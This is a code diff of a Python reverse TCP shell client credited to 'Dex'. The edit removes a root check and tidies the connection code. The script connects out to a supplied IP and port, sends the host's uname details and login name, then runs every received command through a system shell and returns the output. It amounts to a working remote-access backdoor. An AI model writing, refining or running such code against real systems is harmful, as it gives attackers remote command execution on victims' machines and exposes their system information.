@@ -1,16 +1,14 @@
 import socket,subprocess,getopt,sys,os
 
-if os.geteuid() != 0:
-	exit("[!] Root privileges are required to run this script.")
-
 def usage():
 
 	print("\nReverse TCP (Client) by Dex")
 	print()
 	print("Usage: connect.py -i <ip> -p <port>")
 	print("Example: connect.py -i 192.168.0.4 -p 8000")
-	print("Example:  connect.py -i 62.37.142.7 -p 1337")
+	print("Example: connect.py -i 62.37.142.7 -p 1337")
 	sys.exit(0)
+
 
 def main():
 	host = ''
@@ -18,7 +16,6 @@ def main():
 
 	if not len(sys.argv[1:]):
 		usage()
-
 	try:
 		opts, args = getopt.getopt(sys.argv[1:], "hi:p:",["help","ip=","port="])
 	except getopt.GetoptError as err:
@@ -37,23 +34,20 @@ def main():
 				exit("[!] Port parameter requires number.\n%s was supplied." % (port))
 		else:
 			assert False,"Unhandled Option"
-	connect(host,port)
+	connect(ip,port)
 
-def connect(host,port):
+def connect(ip,port):
 
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+		s.connect((ip,port))
 
-	s.connect((host,port))
-
-	# sends system information back to the remote host.
-	x_info = ""
-	for x in os.uname():
-		x_info += x + ","
-	x_info += os.getlogin()
-	x_info = x_info.encode('utf-8')
-	s.send(x_info)
-	shell(s)
-	s.close()
+		x_info = ""
+		for x in os.uname():
+			x_info += x + ","
+		x_info += os.getlogin()
+		x_info = x_info.encode('utf-8')
+		s.send(x_info)
+		shell(s)
 
 def shell(s):
 
@@ -62,7 +56,7 @@ def shell(s):
 		command = command.decode('utf-8')
 
 		if command != "exit":
-			sh = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			sh = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 			out, err = sh.communicate()
 
@@ -71,5 +65,6 @@ def shell(s):
 		else:
 			break
 	s.close()
+
 if __name__ == "__main__":
 	main()
